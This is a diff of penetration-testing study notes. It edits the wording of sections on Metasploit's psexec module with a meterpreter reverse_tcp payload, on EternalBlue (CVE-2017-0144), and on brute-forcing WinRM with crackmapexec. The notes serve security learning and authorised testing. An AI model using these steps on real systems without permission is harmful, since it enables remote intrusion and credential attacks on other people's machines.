@@ -397,25 +397,24 @@ psexec.py Administrator:Password@10.63.45.88 ipconfig
 
 The psexec exploit module `exploit/windows/smb/psexec`  will authenticate through psexec to smb and then upload a meterpreter payload.  This is installing software on the target so be aware of Antivirus solutions which could detection the software as malicious.
 
-1. <u>Find/Use the module</u>: Can just search for `psexec` and select the psexec exploit or `use exploit/windows/smb/psexec `. The payload will probably be set to `windows/meterpreter/reverse_tcp` which 32-bit but its fine:
+1. **Find/Use the module**: Can just search for `psexec` in Metasploit and select the psexec exploit  or `use exploit/windows/smb/psexec `. The payload will probably be set to `windows/meterpreter/reverse_tcp` which 32-bit but its fine:
 ```
 #### search psexec ####
 
 use exploit/windows/smb/psexec
 ```
-3. <u>Configure the module</u>: We'll need to set the target with `RHOSTS` and then the `SMBUser`  and `SMBPass` of the account. You can also configure the payload which you can set to your machine `LHOST` & `LPORT`.
+2. **Configure the module**: We'll need to set the target with `RHOSTS` and then the `SMBUser`  and `SMBPass` of the account. You can also configure the payload which you can set to your machine `LHOST` & `LPORT`.
 
 ```
 set RHOST target
 set SMBUser <username>
 set SMBPass <password>
 ```
-4. Run the exploit using just `exploit`. This should start a meterpreter session when done.
-
+4. Run the exploit using just `exploit`. This should start a meterpreter session if successful.
 
 ### EternalBlue
 
-EternalBlue (CVE-2017-0144) is a Windows vulnerability developed by the NSA that exploits a flaw in the SMBv1 protocol, allowing attackers to remotely execute code by sending crafted packets. It can lead to reverse shells or meterpreter sessions and includes automatic privilege escalation. The vulnerability gained notoriety during the **WannaCry ransomware attack** in 2017, which used EternalBlue to spread across networks, infecting Windows systems. EternalBlue impacts various Windows versions, including Vista, 7/8.1/10, and Windows Server 2008/2012/2016, particularly effective on Windows 7/8.1 and Server 2008/2012. A patch was released in March 2017, though many systems remain unpatched.
+EternalBlue (CVE-2017-0144) is a Windows vulnerability developed by the NSA that exploits a flaw in the SMBv1 protocol, allowing attackers to remotely execute code by sending crafted packets. It can lead to reverse shells/meterpreter sessions and includes automatic privilege escalation. The vulnerability gained notoriety during the **WannaCry ransomware attack** in 2017, which used EternalBlue to spread across networks, infecting Windows systems. EternalBlue impacts various Windows versions, including Vista, 7/8.1/10, and Windows Server 2008/2012/2016, particularly effective on Windows 7/8.1 and Server 2008/2012. A patch was released in March 2017, though many systems remain unpatched.
 
 Metasploit offers an **auxiliary module** to check for vulnerable systems and an **exploit module** to target unpatched systems, providing privileged access and a meterpreter session.
 
@@ -722,9 +721,9 @@ Tools like _crackmapexec_ can be used to perform brute-force attacks on WinRM to
 nmap -sV -p5985,5986 target
 ```
 
-#### Crackmapexec
+#### Brute force WinRM using Crackmapexec
 
-The _crackmapexec_ tool can be used for cracking various protocols including winrm.
+The _crackmapexec_ tool can be used for cracking various protocols including winrm. We can use the tool to brute force winrm.
 - Available protocols: `ssh | winrm | smb | rdp | mssql | ldap | ftp`
 
 General Brute Force Syntax: 
